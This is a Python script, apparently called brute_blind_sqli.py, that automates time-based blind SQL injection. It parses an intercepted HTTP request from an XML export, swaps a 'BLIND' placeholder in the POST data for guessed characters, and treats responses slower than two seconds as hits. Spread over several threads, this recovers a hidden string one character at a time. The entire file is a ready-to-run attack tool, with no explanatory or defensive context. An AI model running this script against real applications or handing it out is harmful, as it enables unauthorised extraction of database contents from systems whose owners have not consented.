import time
import requests
import sys
import xml.etree.ElementTree as ET
import base64
import concurrent.futures
import argparse

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

valid_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!?/()[]&$:;#_'


def try_char(url, post_data, current_payload, char_range):
    for char in char_range:
        post_data_modified = post_data.replace('BLIND', current_payload+char).encode('ISO-8859-1')
        start_time = time.time()
        response = requests.post(url, data=post_data_modified, headers=headers, allow_redirects=False)
        end_time = time.time()
        if end_time-start_time > 2:
            return char


def main():
    if len(sys.argv) < 2:
        print("Usage: python brute_blind_sqli.py <request_file_path>")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="Script to demonstrate threading with specified thread count.")
    parser.add_argument("file", type=str, help="Path to the file")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads to run (default: 1)")
    args = parser.parse_args()

    safe_file_path = args.file
    thread_size = args.threads
    chunk_size = len(valid_chars) // thread_size

    # Parse the XML file
    tree = ET.parse(safe_file_path)
    root = tree.getroot()

    # Extract the necessary data from the XML
    url = root.find(".//url").text.strip()
    request_base64 = root.find(".//request").get("base64").strip()
    request_data = root.find(".//request").text.strip()

    # Decode the request data if it's in base64 format
    if request_base64.lower() == "true":
        request_data = base64.b64decode(request_data).decode()

    # Extract the last line of the request_data (the POST data)
    post_data = request_data.splitlines()[-1]
    payload = ""

    found = True
    while found:
        found = False
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread_size) as executor:
            futures = []
            for i in range(thread_size):
                char_range = valid_chars[i * chunk_size: (i + 1) * chunk_size]
                future = executor.submit(try_char, url, post_data, payload, char_range)
                futures.append(future)

            for future in concurrent.futures.as_completed(futures):
                next_char = future.result()
                if next_char:
                    payload += next_char
                    print(f"Valid response found! Updated payload: {payload}")
                    executor.shutdown(wait=False)
                    found=True
                    break

    print(f"String found: {payload}")


if __name__ == "__main__":
    main()
